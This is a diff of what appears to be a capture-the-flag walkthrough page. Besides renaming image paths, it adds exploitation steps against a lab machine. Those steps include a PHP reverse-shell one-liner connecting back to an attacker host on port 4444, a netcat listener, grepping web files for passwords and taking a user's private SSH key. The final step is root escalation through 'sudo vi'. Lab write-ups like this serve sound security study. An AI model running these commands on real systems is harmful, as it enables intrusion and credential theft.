@@ -11,9 +11,9 @@
 <pre><code><strong>nmap -A $VICTIM
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (3).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
 
@@ -30,7 +30,7 @@ No other ports found
 <pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### TCP/21 - FTP
 
@@ -64,7 +64,7 @@ gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Co
 
 We can run commands here and we see the key\_rev\_key file
 
-![](<../../.gitbook/assets/image (2).png>)
+![](<../../.gitbook/assets/image (2) (8).png>)
 
 
 
@@ -74,7 +74,7 @@ We go there by the url and we can download it
 
 
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -86,27 +86,84 @@ strings key_rev_key
 
 
 
-Let\u2019s try to get reverse shell
 
-php -r '$sock=fsockopen("10.2.12.26",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 
-Start netcat listener
+### Web Shell
 
+**Web**
+
+```
+php -r '$sock=fsockopen("$KALI",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
 nc -lvp 4444
+```
+
+Get autocomplete
+
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+ctrl + Z
+stty raw -echo;fg
+```
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+cd /var/www/html/
+grep password *
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+### Shell
+
+I was not able to su into charlie with the password, the credentials did work for the web login but it just brought me to the command page.
+
+**Victim**
+
+```
+cd /home/charlie/
+cat teleport
+```
+
+I copied the teleport private key to kali
+
+**Kali**
+
+```
+subl teleport 
+chmod 700 teleport
+ssh -i teleport charlie@$VICTIM  
+```
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+### Privilege Escalation
+
+**Exploit Link:** [https://gtfobins.github.io/gtfobins/vi/](https://gtfobins.github.io/gtfobins/vi/)
+
+Charlie can run vi with no passwd so I just followed the link above to become root
+
+**Victim**
+
+```
+sudo -l
+sudo vi -c ':!/bin/sh' /dev/null
+```
+
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 
 
-
-
-
-
-
-
-
-
-
-
-
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 
 
